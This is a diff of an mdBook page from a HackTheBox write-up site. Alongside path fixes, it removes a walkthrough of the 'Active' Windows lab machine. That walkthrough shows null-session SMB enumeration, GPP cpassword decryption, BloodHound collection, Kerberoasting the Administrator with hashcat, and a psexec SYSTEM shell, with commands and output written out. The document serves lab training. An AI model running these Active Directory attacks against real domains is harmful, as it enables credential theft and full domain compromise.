@@ -3,8 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Walkthroughs</title>
-        <meta name="robots" content="noindex">
+        <title>Retro - Walkthroughs</title>
 
 
         <!-- Custom HTML head -->
@@ -13,34 +12,34 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="theme-color" content="#ffffff">
 
-        <link rel="icon" href="favicon.svg">
-        <link rel="shortcut icon" href="favicon.png">
-        <link rel="stylesheet" href="css/variables.css">
-        <link rel="stylesheet" href="css/general.css">
-        <link rel="stylesheet" href="css/chrome.css">
-        <link rel="stylesheet" href="css/print.css" media="print">
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
 
         <!-- Fonts -->
-        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
-        <link rel="stylesheet" href="fonts/fonts.css">
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
 
         <!-- Highlight.js Stylesheets -->
-        <link rel="stylesheet" id="highlight-css" href="highlight.css">
-        <link rel="stylesheet" id="tomorrow-night-css" href="tomorrow-night.css">
-        <link rel="stylesheet" id="ayu-highlight-css" href="ayu-highlight.css">
+        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">
 
         <!-- Custom theme stylesheets -->
 
 
         <!-- Provide site root and default themes to javascript -->
         <script>
-            const path_to_root = "";
+            const path_to_root = "../../../";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex.js";
+            window.path_to_searchindex_js = "../../../searchindex.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc.js"></script>
+        <script src="../../../toc.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -107,7 +106,7 @@
             <!-- populated by js -->
             <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
             <noscript>
-                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
             </noscript>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -142,7 +141,7 @@
                     <h1 class="menu-title">Walkthroughs</h1>
 
                     <div class="right-buttons">
-                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                             <i id="print-button" class="fa fa-print"></i>
                         </a>
 
@@ -176,151 +175,8 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h1 id="welcome-to-glitch-writeups-"><a class="header" href="#welcome-to-glitch-writeups-">Welcome to GLITCH Writeups !</a></h1>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="active"><a class="header" href="#active">Active</a></h1>
-<blockquote>
-<p>Active is an easy windows machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.</p>
-</blockquote>
-<hr />
-<h1 id="summary"><a class="header" href="#summary">Summary</a></h1>
-<p>We start enumeration from an unauthenticated standpoint, we find that null authentication is enabled and that we have the permissions to read a share called <code>Replication</code>.</p>
-<p>Inside that share, we find a very interesting file called <code>Groups.xml</code> which is known to be used when <strong>Group Policy Preferences (GPP)</strong> is configured.</p>
-<p>The file contains an encrypted <code>cpassword</code> attribute for user <code>svc_tgs</code>, which can be decrypted using <code>gpp-decrypt</code>.</p>
-<p>After we gain access in Active Directory through <code>svc_tgs</code> user, some bloodhound enumeration shows that <code>Administrator</code> is kerberoastable, after requesting the <code>TGS</code> for administrator we crack the password using <code>hashcat</code> and get <code>NT AUTHORITY/SYSTEM</code> access on the Domain Controller using <code>psexec</code> to retrieve the flags.</p>
-<hr />
-<h1 id="initial-foothold"><a class="header" href="#initial-foothold">Initial Foothold</a></h1>
-<h2 id="enumerating-shares"><a class="header" href="#enumerating-shares">Enumerating Shares</a></h2>
-<p>SMB Null Auth was enabled on the machine, so we will start with enumerating the available shares and see what shares can we read</p>
-<pre><code class="language-bash">└─$ netexec smb $(cat ip) -u "" -p "" --shares                                             
-SMB         10.129.100.141  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
-SMB         10.129.100.141  445    DC               [+] active.htb\: 
-SMB         10.129.100.141  445    DC               [*] Enumerated shares
-SMB         10.129.100.141  445    DC               Share           Permissions     Remark
-SMB         10.129.100.141  445    DC               -----           -----------     ------
-SMB         10.129.100.141  445    DC               ADMIN$                          Remote Admin
-SMB         10.129.100.141  445    DC               C$                              Default share
-SMB         10.129.100.141  445    DC               IPC$                            Remote IPC
-SMB         10.129.100.141  445    DC               NETLOGON                        Logon server share 
-SMB         10.129.100.141  445    DC               Replication     READ            
-SMB         10.129.100.141  445    DC               SYSVOL                          Logon server share 
-SMB         10.129.100.141  445    DC               Users
-</code></pre>
-<p>We found a share called <code>Replication</code>, which we have <code>READ</code> permission over.</p>
-<h2 id="enumerating-the-share"><a class="header" href="#enumerating-the-share">Enumerating the share</a></h2>
-<p>NetExec has a module called <code>spider_plus</code> which will go over the share and enumerate all the files that our user can read, and list these files in JSON format.</p>
-<p>Here, we specify the <code>-M</code> for telling NetExec that we want to use the <code>spider_plus</code> module, and that we want to run it on the <code>Replication</code> share.</p>
-<pre><code class="language-bash">└─$ netexec smb $(cat ip) -u "" -p "" -M spider_plus --share Replication
-SMB         10.129.100.141  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) 
-SMB         10.129.100.141  445    DC               [+] active.htb\: 
-SPIDER_PLUS 10.129.100.141  445    DC               [*] Started module spidering_plus with the following options:
-SPIDER_PLUS 10.129.100.141  445    DC               [*]  DOWNLOAD_FLAG: False
-SPIDER_PLUS 10.129.100.141  445    DC               [*]     STATS_FLAG: True
-SPIDER_PLUS 10.129.100.141  445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
-SPIDER_PLUS 10.129.100.141  445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
-SPIDER_PLUS 10.129.100.141  445    DC               [*]  MAX_FILE_SIZE: 50 KB
-SPIDER_PLUS 10.129.100.141  445    DC               [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
-SMB         10.129.100.141  445    DC               [*] Enumerated shares
-SMB         10.129.100.141  445    DC               Share           Permissions     Remark
-SMB         10.129.100.141  445    DC               -----           -----------     ------
-SMB         10.129.100.141  445    DC               ADMIN$                          Remote Admin
-SMB         10.129.100.141  445    DC               C$                              Default share
-SMB         10.129.100.141  445    DC               IPC$                            Remote IPC
-SMB         10.129.100.141  445    DC               NETLOGON                        Logon server share 
-SMB         10.129.100.141  445    DC               Replication     READ            
-SMB         10.129.100.141  445    DC               SYSVOL                          Logon server share 
-SMB         10.129.100.141  445    DC               Users                           
-SPIDER_PLUS 10.129.100.141  445    DC               [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.100.141.json".
-SPIDER_PLUS 10.129.100.141  445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
-SPIDER_PLUS 10.129.100.141  445    DC               [*] SMB Readable Shares:  1 (Replication)
-SPIDER_PLUS 10.129.100.141  445    DC               [*] Total folders found:  22
-SPIDER_PLUS 10.129.100.141  445    DC               [*] Total files found:    7
-SPIDER_PLUS 10.129.100.141  445    DC               [*] File size average:    1.16 KB
-SPIDER_PLUS 10.129.100.141  445    DC               [*] File size min:        22 B
-SPIDER_PLUS 10.129.100.141  445    DC               [*] File size max:        3.63 KB
-</code></pre>
-<p>As we see from this line</p>
-<pre><code class="language-bash">Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.100.141.json".
-</code></pre>
-<p>the files was saved under <code>/home/kali/.nxc/modules/nxc_spider_plus/10.129.100.141.json</code>.</p>
-<p>Upon reading that file, we notice that the share has a very interesting file called <code>Groups.xml</code>.</p>
-<pre><code class="language-bash">&lt;SNIP&gt;
-"active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
-            "atime_epoch": "2018-07-21 06:37:44",
-            "ctime_epoch": "2018-07-21 06:37:44",
-            "mtime_epoch": "2018-07-21 06:38:11",
-            "size": "533 B"
-        }
-&lt;SNIP&gt;
-</code></pre>
-<p>This file means that Group Policy Preferences (GPP) is configured.</p>
-<h3 id="what-is-group-policy-preferences-gpp"><a class="header" href="#what-is-group-policy-preferences-gpp">What is Group Policy Preferences (GPP)?</a></h3>
-<p>GPP was introduced with the release of Server 2008 and enhance Group Policy by allowing administrators to configure additional settings beyond standard policy options.
-When an admin used <strong>Group Policy Preferences (GPP)</strong> to set a local user or group password, the password was stored in <strong>Groups.xml inside a tag called <code>cpassword</code>.</strong></p>
-<p>The <code>cpassword</code> is encrypted, but Microsoft shared the AES key used to encrypt the password in their <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">documentation</a>. Which means anyone can decrypt the password.</p>
-<h3 id="downloading-the-file--decrypting-the-password"><a class="header" href="#downloading-the-file--decrypting-the-password">Downloading the file &amp; Decrypting the password</a></h3>
-<pre><code class="language-bash">└─$ smbclient -N //$(cat ip)/Replication
-Anonymous login successful
-Try "help" to get a list of possible commands.
-smb: \&gt; cd active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/
-smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\&gt; get Groups.xml
-getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
-</code></pre>
-<p>Upon reading the file, we can see the <code>cpassword</code> for <code>svc_tgs</code> user.</p>
-<pre><code class="language-xml">&lt;SNIP&gt;
-name="active.htb\SVC_TGS" i
-&lt;SNIP&gt;
-cpassword="ed&lt;REDACTED&gt;mQ"
-&lt;SNIP&gt;
-</code></pre>
-<p>Decrypting the password using <code>gpp-decrypt</code>, not we have a set of credentials <code>svc_tgs:GP&lt;REDACTED&gt;18</code>.</p>
-<pre><code class="language-bash">└─$ gpp-decrypt ed&lt;REDACTED&gt;mQ
-GP&lt;REDACTED&gt;18
-</code></pre>
-<h1 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h1>
-<h2 id="gathering-bloodhound-data"><a class="header" href="#gathering-bloodhound-data">Gathering BloodHound Data</a></h2>
-<p>Using the foothold to enumerate AD using bloodhound.</p>
-<pre><code class="language-bash">└─$ sudo bloodhound-python -u 'svc_tgs' -p 'GP&lt;REDACTED&gt;18' -ns $(cat ip) -d active.htb -c all
-</code></pre>
-<p>After uploading data to bloodhound, we found that the administrator account is kerberoastable</p>
-<p><img src="HackTheBox/Windows/Easy/image.png" alt="image.png" /></p>
-<h2 id="kerberoasting-administrator-using-getuserspns"><a class="header" href="#kerberoasting-administrator-using-getuserspns">Kerberoasting <code>Administrator</code> using <code>GetUserSPNs</code></a></h2>
-<pre><code class="language-bash">└─$ impacket-GetUserSPNs -dc-ip $(cat ip) active.htb/svc_tgs -request-user administrator -outputfile administrator_tgs
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-Password:
-ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
---------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
-active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-09-01 13:47:21.242545             
-
-[-] CCache file is not found. Skipping...
-</code></pre>
-<h2 id="cracking-the-hash-using-hashcat"><a class="header" href="#cracking-the-hash-using-hashcat">Cracking the Hash using Hashcat</a></h2>
-<pre><code class="language-bash">└─$ hashcat -a 0 -m 13100 administrator_tgs /usr/share/wordlists/rockyou.txt
-
-&lt;SNIP&gt;
-$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$418a&lt;REDACTED&gt;1bbb:Ti&lt;REDACTED&gt;68
-&lt;SNIP&gt;
-</code></pre>
-<p>We got the password <code>Ti&lt;REDACTED&gt;68</code></p>
-<h1 id="gaining-access"><a class="header" href="#gaining-access">Gaining Access</a></h1>
-<pre><code class="language-bash">└─$ impacket-psexec active.htb/administrator:'Ti&lt;REDACTED&gt;68'@$(cat ip)  
-Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-[*] Requesting shares on 10.129.100.141.....
-[*] Found writable share ADMIN$
-[*] Uploading file CZBuECdy.exe
-[*] Opening SVCManager on 10.129.100.141.....
-[*] Creating service LNnx on 10.129.100.141.....
-[*] Starting service LNnx.....
-[!] Press help for extra shell commands
-Microsoft Windows [Version 6.1.7601]
-Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-
-C:\Windows\system32&gt; whoami
-nt authority\system
-</code></pre>
-<div style="break-before: page; page-break-before: always;"></div><h1 id="retro"><a class="header" href="#retro">Retro</a></h1>
-<h1 id="initial-foothold-1"><a class="header" href="#initial-foothold-1">Initial FootHold</a></h1>
+                        <h1 id="retro"><a class="header" href="#retro">Retro</a></h1>
+<h1 id="initial-foothold"><a class="header" href="#initial-foothold">Initial FootHold</a></h1>
 <h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
 <h3 id="smb"><a class="header" href="#smb">SMB</a></h3>
 <p>SMB Null Auth was enabled but not useful to us.</p>
@@ -722,6 +578,9 @@ nt authority\system
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../../HackTheBox/Windows/Easy/Active.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
 
 
                         <div style="clear: both"></div>
@@ -730,6 +589,9 @@ nt authority\system
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../../HackTheBox/Windows/Easy/Active.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
 
             </nav>
 
@@ -743,21 +605,16 @@ nt authority\system
         </script>
 
 
-        <script src="elasticlunr.min.js"></script>
-        <script src="mark.min.js"></script>
-        <script src="searcher.js"></script>
+        <script src="../../../elasticlunr.min.js"></script>
+        <script src="../../../mark.min.js"></script>
+        <script src="../../../searcher.js"></script>
 
-        <script src="clipboard.min.js"></script>
-        <script src="highlight.js"></script>
-        <script src="book.js"></script>
+        <script src="../../../clipboard.min.js"></script>
+        <script src="../../../highlight.js"></script>
+        <script src="../../../book.js"></script>
 
         <!-- Custom JS scripts -->
 
-        <script>
-        window.addEventListener('load', function() {
-            window.setTimeout(window.print, 100);
-        });
-        </script>
 
 
     </div>
